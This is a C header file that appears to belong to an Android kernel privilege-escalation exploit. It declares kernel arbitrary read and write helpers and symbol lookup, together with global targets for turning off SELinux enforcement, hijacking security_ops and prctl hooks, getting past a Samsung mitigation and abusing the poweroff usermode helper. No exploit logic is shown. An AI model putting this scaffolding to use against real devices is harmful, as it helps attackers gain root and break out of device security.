#ifndef UTILS_H
#define UTILS_H

#include <err.h>

#define DEBUG 1

#ifdef DEBUG
#include <android/log.h>
#define LOGV(...) { __android_log_print(ANDROID_LOG_INFO, "exploit", __VA_ARGS__); printf(__VA_ARGS__); printf("\n"); fflush(stdout); }
#elif PRINT
#define LOGV(...) { __android_log_print(ANDROID_LOG_INFO, "exploit", __VA_ARGS__); printf(__VA_ARGS__); printf("\n"); fflush(stdout); }
#else
#define LOGV(...)
#endif


#include <sys/prctl.h>
#define EXPLOIT_COMM "MJ116"
#define TASK_COMM_LEN 16

#define handle_error(msg) \
      do { perror(msg); exit(EXIT_FAILURE);  } while (0)

void *get_kallsym_address(const char *, char*);

extern int read_at_address_pipe(void* address, void* buf, size_t len);
extern int write_at_address_pipe(void* address, void* buf, size_t len);
#ifdef __GNUC_GNU_INLINE__
inline int writel_at_address_pipe(void* address, size_t val);
#else
extern inline int writel_at_address_pipe(void* address, size_t val);
#endif
#define get_addr_from_buf(x) ((void*)*(size_t*)(x))
void hexdump(void*, size_t);
/* For bypass samsung mitigation */
size_t get_mm_exe_file;
size_t sys_msync;
/* For bypass samsung mitigation end */

size_t task_prctl_offset;
void *selinux_enabled;
void *selinux_enforcing;
void *security_context_to_sid;
void *cap_task_create;
void *cap_task_prctl;
void *kernel_sock_ioctl;
void *security_ops;
// for call_usermodelhelp()
unsigned long poweroff_work_func;
unsigned long orderly_poweroff;
// for call_usermodelhelp() end
size_t k_security_ops;
size_t init_task;
#endif /* UTILS_H */
